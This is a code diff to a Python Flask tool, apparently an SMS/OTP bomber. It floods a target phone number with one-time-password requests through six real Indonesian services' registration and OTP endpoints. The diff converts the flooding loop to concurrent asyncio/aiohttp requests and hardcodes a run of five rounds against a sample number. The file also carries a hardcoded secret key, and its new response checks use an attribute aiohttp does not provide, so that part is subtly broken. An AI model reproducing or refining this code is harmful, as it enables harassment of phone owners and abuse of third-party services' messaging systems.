@@ -1,7 +1,8 @@
 from flask import Flask, request, render_template, redirect, url_for, flash
 import requests, json, random, uuid
 import os
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import asyncio
+import aiohttp
 app = Flask(__name__)
 app.secret_key = "b'\xfd!\x11\x9frZ%\x93Ip\xbf\xdb8{-B\x14\xb9\xa58B\xa6\xc8\x15'"
 
@@ -49,7 +50,7 @@ def index():
         return redirect(url_for('index'))
     return render_template('index.html')
 
-def send_otp_request(provider, formatted_phone_number):
+async def send_otp_request(session, provider, formatted_phone_number):
     try:
         if provider == 'danacita':
             headers_danacita = {
@@ -74,11 +75,11 @@ def send_otp_request(provider, formatted_phone_number):
                 "username": formatted_phone_number,
             })
             
-            response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
-            if response_danacita.status_code == 200:
-                print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Danacita")
-            else:
-                print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Danacita")
+            async with session.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita) as response_danacita:
+                if response_danacita.status_code == 200:
+                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Danacita")
+                else:
+                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Danacita")
         
         if provider == 'misteraladin':
             headers_misterAladin = {
@@ -108,11 +109,11 @@ def send_otp_request(provider, formatted_phone_number):
                 "type": "register"
             })
             
-            response_mraladin = requests.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin)
-            if response_mraladin.status_code == 200:
-                print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Mister Aladin")
-            else: 
-                print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Mister Aladin")
+            async with session.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin) as response_misterAladin: 
+                if response_misterAladin.status_code == 200:
+                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Mister Aladin")
+                else: 
+                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Mister Aladin")
 
         if provider == 'pinhome':
             headers_pinhome = {
@@ -144,11 +145,11 @@ def send_otp_request(provider, formatted_phone_number):
                 "phoneNumber": formatted_phone_number
             })
             
-            response_pinhome = requests.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome)
-            if response_pinhome.status_code == 201:
-                print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Pinhome")
-            else:
-                print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Pinhome")
+            async with session.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome) as response_pinhome: 
+                if response_pinhome.status_code == 201:
+                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Pinhome")
+                else:
+                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Pinhome")
         
         if provider == 'kelaspintar':
             headers_kelaspintar = {
@@ -174,11 +175,11 @@ def send_otp_request(provider, formatted_phone_number):
                 "phone_number": formatted_phone_number,
             })
             
-            response_kelaspintar = requests.post("https://api.kelaspintar.id/uaa/v1/auth/check/phone_number", headers=headers_kelaspintar, data=data_kelaspintar)
-            if response_kelaspintar.status_code == 200:
-                print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Kelas Pintar")
-            else:
-                print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Kelas Pintar")
+            async with session.post("https://api.kelaspintar.id/uaa/v1/auth/check/phone_number", headers=headers_kelaspintar, data=data_kelaspintar) as response_kelaspintar:  
+                if response_kelaspintar.status_code == 200:
+                    print(f"Berhasil Mengirim SMS/WA To : {formatted_phone_number} via Kelas Pintar")
+                else:
+                    print(f"Gagal mengirim SMS/WA To : {formatted_phone_number} via Kelas Pintar")
         
         if provider =='sobatbangun':
             headers_sobatbang = {
@@ -203,11 +204,11 @@ def send_otp_request(provider, formatted_phone_number):
                 "email_or_phone": formatted_phone_number,
             })
             
-            response_sobatbangun = requests.post("https://api.sobatbangun.com/auth/otp/send-otp", headers=headers_sobatbang, data=data_sobatbangun)
-            if response_sobatbangun.status_code == 201:
-                print(f"Berhasil mengirim OTP To : {formatted_phone_number} via SobatBangun")
-            else:
-                print(f"Gagal mengirim OTP To : {formatted_phone_number} via SobatBangun")
+            async with session.post("https://api.sobatbangun.com/auth/otp/send-otp", headers=headers_sobatbang, data=data_sobatbangun) as response_sobatbangun:  
+                if response_sobatbangun.status_code == 201:
+                    print(f"Berhasil mengirim OTP To : {formatted_phone_number} via SobatBangun")
+                else:
+                    print(f"Gagal mengirim OTP To : {formatted_phone_number} via SobatBangun")
         if provider == 'nutriclub':
             headers_nutriclub = {
                 "Accept": "application/json, text/javascript, */*; q=0.01",
@@ -232,25 +233,23 @@ def send_otp_request(provider, formatted_phone_number):
                 "old_phone": formatted_phone_number,
             })
                     
-            response_data_nutriclub = requests.post(f"https://www.nutriclub.co.id/membership/otp/?phone={formatted_phone_number}&old_phone={formatted_phone_number}", headers=headers_nutriclub, data=data_nutriclub)
-            if response_data_nutriclub.status_code == 200:
-                print(f"Berhasil mengirim OTP To: {formatted_phone_number} via Nutriclub")
-            else:
-                print(f"Gagal mengirim OTP To: {formatted_phone_number} via Nutriclub")
+            async with session.post(f"https://www.nutriclub.co.id/membership/otp/?phone={formatted_phone_number}&old_phone={formatted_phone_number}", headers=headers_nutriclub, data=data_nutriclub) as response_nutriclub:
+                if response_nutriclub.status_code == 200:
+                    print(f"Berhasil mengirim OTP To: {formatted_phone_number} via Nutriclub")
+                else:
+                    print(f"Gagal mengirim OTP To: {formatted_phone_number} via Nutriclub")
     except Exception as e:
         print(f"An error occurred while sending OTP via {provider}: {e}")
 
-def send_otp(phone_number, otp_count):
+async def send_otp(phone_number, otp_count):
     providers = ['danacita', 'misteraladin', 'pinhome', 'kelaspintar', 'sobatbangun', 'nutriclub']
-    formatted_phone_number = format_phone_number('sayurbox', phone_number)  # Example formatting, adjust as needed
+    formatted_phone_number = format_phone_number('sayurbox', phone_number)
 
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = [executor.submit(send_otp_request, provider, formatted_phone_number) for provider in providers for _ in range(otp_count)]
-        for future in as_completed(futures):
-            try:
-                future.result()
-            except Exception as e:
-                print(f"Error sending OTP: {e}")
+    async with aiohttp.ClientSession() as session:
+        tasks = [send_otp_request(session, provider, formatted_phone_number) for provider in providers for _ in range(otp_count)]
+        await asyncio.gather(*tasks)
                 
 if __name__ == '__main__':
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(send_otp('+628123456789', 5))
     app.run(debug=True)
